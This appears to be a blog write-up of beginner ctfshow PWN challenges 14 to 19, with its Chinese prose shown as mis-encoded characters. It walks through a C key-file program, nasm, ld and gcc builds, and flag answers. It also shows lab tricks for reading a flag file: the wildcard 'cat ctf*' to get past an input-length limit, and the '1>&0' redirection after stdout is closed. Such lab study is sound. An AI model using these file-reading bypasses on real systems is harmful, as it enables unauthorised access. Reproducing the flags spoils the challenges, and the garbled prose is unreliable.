<p>è¿™ä¸ªæ–‡ä»¶æœ‰å¼ºåº¦äº†ï¼Œç›´æ¥ç¼–è¯‘è¿è¡Œä¼šè¯´nothing is hereï¼Œä¸ç»™flagï¼Œå…ˆè¯»ä¸€ä¸‹è¿™ä¸ªCè¯­è¨€æ–‡ä»¶åœ¨å¹²ä»€ä¹ˆçš„ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>                  <span class="c1">// æ–‡ä»¶æŒ‡é’ˆï¼Œç”¨äºæ“ä½œæ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>  <span class="c1">// ç¼“å†²åŒºï¼Œå­˜å‚¨ä»æ–‡ä»¶è¯»å–çš„äºŒè¿›åˆ¶æ•°æ®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span>                  <span class="c1">// è®°å½•æ¯æ¬¡å®é™…è¯»å–çš„å­—èŠ‚æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>   <span class="c1">// ä»¥äºŒè¿›åˆ¶åªè¯»æ–¹å¼æ‰“å¼€åä¸º &#34;key&#34; çš„æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Nothing here!&#34;</span><span class="p">);</span>  <span class="c1">// è‹¥æ‰“å¼€å¤±è´¥ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// è¾“å‡ºç¼“å†²åŒºï¼šå¤§å°ä¸º BUFFER_SIZE*9 + 12ï¼ˆé¢„ç•™è¶³å¤Ÿç©ºé—´å­˜å‚¨äºŒè¿›åˆ¶å­—ç¬¦ä¸²å’Œåˆ†éš”ç¬¦ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">output</span><span class="p">[</span><span class="n">BUFFER_SIZE</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">+</span> <span class="mi">12</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// è®°å½• output ä¸­å½“å‰å·²ä½¿ç”¨çš„ä½ç½®ï¼ˆåç§»é‡ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// å…ˆåœ¨ output å¼€å¤´å†™å…¥ &#34;ctfshow{&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;ctfshow{&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// å¾ªç¯è¯»å–æ–‡ä»¶å†…å®¹ï¼šæ¯æ¬¡æœ€å¤šè¯» BUFFER_SIZE å­—èŠ‚ï¼Œç›´åˆ°æ–‡ä»¶ç»“æŸ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">((</span><span class="n">n</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">),</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="n">fp</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// éå†æœ¬æ¬¡è¯»å–çš„æ¯ä¸ªå­—èŠ‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// å°†å½“å‰å­—èŠ‚æ‹†åˆ†ä¸º 8 ä½äºŒè¿›åˆ¶ï¼ˆä»é«˜ä½åˆ°ä½ä½ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// (buffer[i] &gt;&gt; j) &amp; 1ï¼šè·å–ç¬¬ j ä½ï¼ˆ0 æˆ– 1ï¼‰ï¼Œå¹¶å†™å…¥ output
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// é™¤äº†æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ååŠ ä¸‹åˆ’çº¿ &#34;_&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;_&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// è‹¥æœªåˆ°æ–‡ä»¶æœ«å°¾ï¼Œåœ¨æœ¬æ¬¡ç¼“å†²åŒºæ•°æ®ååŠ ç©ºæ ¼ &#34; &#34;ï¼ˆåˆ†éš”ä¸åŒæ‰¹æ¬¡çš„è¯»å–ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">feof</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// åœ¨ output æœ«å°¾å†™å…¥ &#34;}&#34;ï¼Œå®Œæˆæ ¼å¼åŒ…è£¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">offset</span> <span class="o">+=</span> <span class="nf">sprintf</span><span class="p">(</span><span class="n">output</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="s">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// æ‰“å°æœ€ç»ˆç”Ÿæˆçš„å­—ç¬¦ä¸²
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>  <span class="c1">// å…³é—­æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåä¸ºkeyçš„æ–‡ä»¶ï¼Œè®©è¿™ä¸ªç¨‹åºçŸ¥é“ï¼Œç„¶åä»–å°±èƒ½æŠŠflagå­—ç¬¦ä¸²åå‡ºæ¥äº†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;CTFshow&#34;</span>&gt; key  <span class="c1">#åˆ›å»ºä¸€ä¸ªåä¸ºkeyå¾—æ–‡ä»¶ï¼Œå‘å†…è¾“å…¥â€œCTFshowâ€çš„å­—ç¬¦ä¸²</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/35.png"
	width="1145"
	height="336"
	srcset="/p/ctfshow-pwn-writeup/35_hu_df60cb17ad88303e.png 480w, /p/ctfshow-pwn-writeup/35_hu_aca6ec48c69a455b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="340"
		data-flex-basis="817px"
	
></p>
<p>ç­”æ¡ˆæ˜¯ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}</p>
<p>é¢˜ç›®è¦æ±‚åœ¨keyé‡ŒåŠ CTFshowå­—ç¬¦ä¸²ï¼ŒåŠ å…¶å®ƒæ˜¯é”™çš„ï¼Œè¾“å‡ºç»“æœä¸åŒã€‚</p>
<h3 id="pwn_015">PWN_015
</h3><p>é¢˜ç›®ï¼šç¼–è¯‘æ±‡ç¼–ä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯æ‹¿åˆ°flagã€‚ <a class="link" href="PWN_015%5cflag.asm" >flag.asm</a></p>
<p>æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf flag.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o flag1 flag.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>ï¼ˆflag1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰</p>
<p><img src="/p/ctfshow-pwn-writeup/36.png"
	width="624"
	height="165"
	srcset="/p/ctfshow-pwn-writeup/36_hu_fda5333d80d87b82.png 480w, /p/ctfshow-pwn-writeup/36_hu_4d6103555c03c502.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="378"
		data-flex-basis="907px"
	
></p>
<p>æ¯”è¾ƒç®€å•ï¼Œå’Œ<a class="link" href="https://expl0rer.top/p/ctfshow-pwn-writeup/#pwn_005"  target="_blank" rel="noopener"
    >PWN_005</a>å¾ˆç±»ä¼¼ï¼Œéƒ½æ˜¯æ±‡ç¼–è¯­è¨€ç¼–è¯‘è¿è¡Œä¹‹ç±»çš„ã€‚</p>
<p>ctfshow{@ss3mb1y_1s_3@sy}</p>
<h3 id="pwn_016">PWN_016
</h3><p>é¢˜ç›®ï¼šä½¿ç”¨gccå°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ <a class="link" href="PWN_016%5cflag.s" >flag.s</a></p>
<p><img src="/p/ctfshow-pwn-writeup/37.png"
	width="646"
	height="104"
	srcset="/p/ctfshow-pwn-writeup/37_hu_b3e8aef3e1ef05a0.png 480w, /p/ctfshow-pwn-writeup/37_hu_af79549354799dd4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="621"
		data-flex-basis="1490px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc flag.s -o flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥ä½¿ç”¨ gcc å‘½ä»¤ç›´æ¥ç¼–è¯‘æ±‡ç¼–è¯­è¨€æºæ–‡ä»¶ï¼ˆ .s æ–‡ä»¶ï¼‰å¹¶å°†å…¶é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚ gcc å‘½ä»¤å…·æœ‰é€‚ç”¨äºå¤šç§è¯­è¨€çš„ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºåŠŸèƒ½ï¼Œå®ƒå¯ä»¥æ ¹æ®è¾“å…¥æ–‡ä»¶çš„æ‰©å±•åè‡ªåŠ¨é€‰æ‹©é€‚å½“çš„ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ã€‚</p>
<p>æ•…flagï¼šctfshow{daniuniuda}</p>
<h3 id="pwn_017">PWN_017
</h3><p>é¢˜ç›®ï¼šæœ‰äº›å‘½ä»¤å¥½åƒæœ‰ç‚¹ä¸ä¸€æ ·ï¼Ÿä¸è¦ä¸€ç›´ç­‰ï¼Œå¯èƒ½é‚£æ ·æ°¸è¿œä¹Ÿç­‰ä¸åˆ°flagã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/38.png"
	width="930"
	height="325"
	srcset="/p/ctfshow-pwn-writeup/38_hu_7d79a6ffed12bd13.png 480w, /p/ctfshow-pwn-writeup/38_hu_bffb150ab5d0f0e3.png 1024w"
	loading="lazy"
	
		alt="è¿›ç¨‹3"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="686px"
	
></p>
<p>æ¯”è¾ƒå¥‡è‘©çš„æ˜¯ï¼Œè¿™é‡Œé€‰æ‹©3çš„è¯ï¼Œä¸€ç›´åœ¨loadingçš„ï¼Œå¯èƒ½æ˜¯ä¸é€šçš„ï¼Œæˆ‘æ¢åˆ°ä¸»æœºçš„ncä¹Ÿä¸è¡Œï¼Œé‚£å°±æ˜¯é€‰2è¿›ç¨‹çš„</p>
<p><img src="/p/ctfshow-pwn-writeup/39.png"
	width="879"
	height="536"
	srcset="/p/ctfshow-pwn-writeup/39_hu_feeea272629e1334.png 480w, /p/ctfshow-pwn-writeup/39_hu_cc955cd53b60ba21.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="393px"
	
></p>
<p>é€‰äº†2åï¼Œç¨‹åºå¼€å§‹å‘ç™«äº†&hellip;.ï¼Œä¸€ç›´å¾ªç¯æå¾—æˆ‘Kaliè™šæ‹Ÿæœºå¡æ­»äº†ï¼Œè¿›åˆ°IDAx64å»çœ‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/40.png"
	width="1160"
	height="423"
	srcset="/p/ctfshow-pwn-writeup/40_hu_4ec1173fad870b57.png 480w, /p/ctfshow-pwn-writeup/40_hu_9873e66f0cb6080d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="274"
		data-flex-basis="658px"
	
></p>
<p>è¿™ä¸ªcase2çš„readå‡½æ•°åªè¯»å–10å­—èŠ‚ä»¥å†…çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ctfshow_flagï¼ˆ12byteï¼‰è¿™ä¸²æ˜¯è¶…å­—èŠ‚é™åˆ¶äº†ã€‚ä¸è¿‡ä¹‹å‰å­¦äº†é‚£ä¸ªæŒ‡ä»¤æœ‰é€šé…ç¬¦çš„cat ctf*ï¼ˆå› ä¸ºå½“ä½ é€‰æ‹©â€ls ./â€œï¼Œæ‰“å¼€å…¨éƒ¨æ–‡ä»¶åï¼Œå‘ç°åªæœ‰ä¸€ä¸ªctfshow_flagæ—¶ç”±ctfå­—çœ¼çš„ï¼Œé‚£æˆ‘ä»¬æ­£å¥½å¯ä»¥ç»•è¿‡è¶…å­—èŠ‚çš„é™åˆ¶äº†ï¼‰</p>
<p>æœç´¢æ‰“å¼€ç”±ctfè¿™ä¸²å­—ç¬¦çš„æ–‡ä»¶å†…å®¹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/41.png"
	width="691"
	height="231"
	srcset="/p/ctfshow-pwn-writeup/41_hu_fc1a2ff65540e4c9.png 480w, /p/ctfshow-pwn-writeup/41_hu_6ea90f86dc5d2b36.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="299"
		data-flex-basis="717px"
	
></p>
<h3 id="pwn_018">PWN_018
</h3><p>é¢˜ç›®ï¼šä»”ç»†çœ‹çœ‹æºç ï¼Œæˆ–è®¸æœ‰æƒŠå–œï¼›å‡ä½œçœŸæ—¶çœŸäº¦å‡ï¼ŒçœŸä½œå‡æ—¶å‡äº¦çœŸã€‚ <a class="link" href="PWN_018" >PWN_018</a></p>
<p>è¿æ¥ncåä¸€ä¸Šæ¥å°±é—®ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/42.png"
	width="754"
	height="275"
	srcset="/p/ctfshow-pwn-writeup/42_hu_b8edf74f377f50dc.png 480w, /p/ctfshow-pwn-writeup/42_hu_48a1d4051a0ee6e8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="274"
		data-flex-basis="658px"
	
></p>
<p>è¿™æˆ‘å“ªçŸ¥é“å•Šï¼Ÿå»çœ‹IDAx64ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/43.png"
	width="736"
	height="230"
	srcset="/p/ctfshow-pwn-writeup/43_hu_a7c9b35aa1d7b9e4.png 480w, /p/ctfshow-pwn-writeup/43_hu_566fc56e89492c97.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="768px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/44.png"
	width="905"
	height="370"
	srcset="/p/ctfshow-pwn-writeup/44_hu_c4fb8fcadd3dd78e.png 480w, /p/ctfshow-pwn-writeup/44_hu_1ce437554407a80a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="587px"
	
></p>
<p>åˆ†åˆ«è·Ÿè¿›ä¸€ä¸‹realå’Œfakeï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/46.png"
	width="689"
	height="156"
	srcset="/p/ctfshow-pwn-writeup/46_hu_4f7764fbe823e672.png 480w, /p/ctfshow-pwn-writeup/46_hu_faedb59ceeafafd5.png 1024w"
	loading="lazy"
	
		alt="fake"
	
	
		class="gallery-image" 
		data-flex-grow="441"
		data-flex-basis="1060px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/47.png"
	width="711"
	height="189"
	srcset="/p/ctfshow-pwn-writeup/47_hu_c473fd1e4140dc1a.png 480w, /p/ctfshow-pwn-writeup/47_hu_f4c64f3e30a094f4.png 1024w"
	loading="lazy"
	
		alt="real"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="902px"
	
></p>
<p>è§£è¯»ä¸€ä¸‹å‘ç°ä¸€ä¸ªæœºåˆ¶ï¼šå½“v4ä¸ç­‰äº9æ—¶å°±ä¼šæ‰§è¡Œrealå‡½æ•°ï¼Œè¿™æ—¶realä¼šæ‰§è¡Œ<code>echo 'flag is here'&gt;/ctfshow_flag</code>ï¼Œè¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² &lsquo;flag is here&rsquo; è¦†ç›–å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ã€‚ &gt; ç¬¦å·è¡¨ç¤ºä»¥è¦†ç›–çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœ /ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­åŸæœ‰çš„å†…å®¹æ›¿æ¢ä¸º &lsquo;flag is here&rsquo; ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ ç¬¬ä¸€æ¬¡å’Œé¶æœºäº¤äº’æ—¶æ²¡è¾“å…¥9ï¼Œä½ ä»¥åéƒ½ä¸å¾—ä¸åˆ°flagäº†ï¼Œåªèƒ½é‡å¼€é¶æœº&hellip;..æ¯”è¾ƒCSå§&hellip;</p>
<p><code>echo 'flag is here'&gt;&gt;/ctfshow_flag</code>è¿™ä¸ªå‘½ä»¤å°†å­—ç¬¦ä¸² &lsquo;flag is here&rsquo; <em><strong>è¿½åŠ </strong></em>å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ã€‚ &raquo; ç¬¦å·è¡¨ç¤ºä»¥è¿½åŠ çš„æ–¹å¼å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚å¦‚æœ /ctfshow_flag æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å‘½ä»¤ä¼šåœ¨æ–‡ä»¶çš„æœ«å°¾æ·»åŠ  &lsquo;flag is here&rsquo; ã€‚</p>
<p>è¿™ä¸¤ä¸ªå‘½ä»¤éƒ½ç”¨äºå°† &lsquo;flag is here&rsquo; å†™å…¥ /ctfshow_flag æ–‡ä»¶ä¸­ï¼Œä¸åŒä¹‹å¤„åœ¨äºå†™å…¥æ–¹å¼çš„ä¸åŒã€‚ç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨è¿½åŠ æ–¹å¼ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ å†…å®¹ï¼›ç¬¬äºŒä¸ªå‘½ä»¤ä½¿ç”¨è¦†ç›–æ–¹å¼ï¼Œå°†æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ–°å†…å®¹ã€‚å…·ä½“ä½¿ç”¨å“ªä¸ªå‘½ä»¤å–å†³äºéœ€æ±‚å’Œæ–‡ä»¶æ“ä½œçš„é¢„æœŸç»“æœã€‚ä¹Ÿå°±æ˜¯æ‰€å‡çš„å…¶å®æ˜¯æˆ‘ä»¬éœ€è¦çš„çœŸçš„ï¼ŒçœŸçš„åè€Œæ˜¯å‡çš„åœ¨è¿œç¨‹ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ¬¡è¯»åˆ°flagï¼Œå¦åˆ™åç»­å¾—åˆ°çš„flagéƒ½å·²ç»è¢«è¦†å†™å†è¿½åŠ ï¼ŒçœŸå®çš„flagå†…å®¹å·²ç»æ²¡äº†ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/45.png"
	width="751"
	height="315"
	srcset="/p/ctfshow-pwn-writeup/45_hu_5e1d20db51249b2d.png 480w, /p/ctfshow-pwn-writeup/45_hu_acaf9b3fd36a04e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="238"
		data-flex-basis="572px"
	
></p>
<h3 id="pwn_019">PWN_019
</h3><p>é¢˜ç›®ï¼šå…³é—­äº†è¾“å‡ºæµï¼Œä¸€å®šæ˜¯æœ€å®‰å…¨çš„å—ï¼Ÿ <a class="link" href="PWN_019" >PWN_019</a></p>
<p><img src="/p/ctfshow-pwn-writeup/48.png"
	width="1315"
	height="636"
	srcset="/p/ctfshow-pwn-writeup/48_hu_2e667aaa82bc0e4f.png 480w, /p/ctfshow-pwn-writeup/48_hu_d60e1adae16a1f50.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="496px"
	
></p>
<p>åœ¨IDAä¸Šçœ‹åˆ°ï¼Œæ˜¯ç”±readå’Œsystemå‡½æ•°çš„ï¼ŒæŒ‰é“ç†æˆ‘ç›´æ¥cat /ctf*åº”è¯¥å°±å‡ºflagäº†å•Š&hellip;</p>
<p>é—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªfcloseå‡½æ•°ï¼ˆç¡®å®æ²¡è¾™äº†ï¼Œåªèƒ½ç”¨AIè§£é‡Šä¸€ä¸‹äº†ï¼‰ä½œç”¨æ˜¯å…³é—­æ–‡ä»¶è¾“å‡ºæµï¼Œæ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼ˆæ— æ³•æ˜¾ç¤ºï¼‰ã€‚</p>
<p>é‚£è¿˜æœ‰<strong>è¾“å…¥æµ</strong>å•Šï¼Œå¯ä»¥ç”¨é‡å®šå‘ï¼š<strong><code>1&gt;&amp;0</code></strong></p>
<p>è¿™æ˜¯ Linux çš„ I/O é‡å®šå‘è¯­æ³•ï¼š</p>
<ul>
<li><code>1</code> ä»£è¡¨<strong>æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰</strong>ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œå‘½ä»¤çš„è¾“å‡ºä¼šé€åˆ°è¿™é‡Œï¼Œæ˜¾ç¤ºåœ¨ç»ˆç«¯ï¼‰ï¼›</li>
<li><code>0</code> ä»£è¡¨<strong>æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰</strong>ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·è¾“å…¥ä»è¿™é‡Œè¯»å–ï¼Œé€šå¸¸æŒ‡å‘ç»ˆç«¯ï¼‰ï¼›</li>
<li><code>1&gt;&amp;0</code> è¡¨ç¤ºï¼š<strong>å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥æ‰€æŒ‡å‘çš„ä½ç½®</strong>ã€‚</li>
</ul>
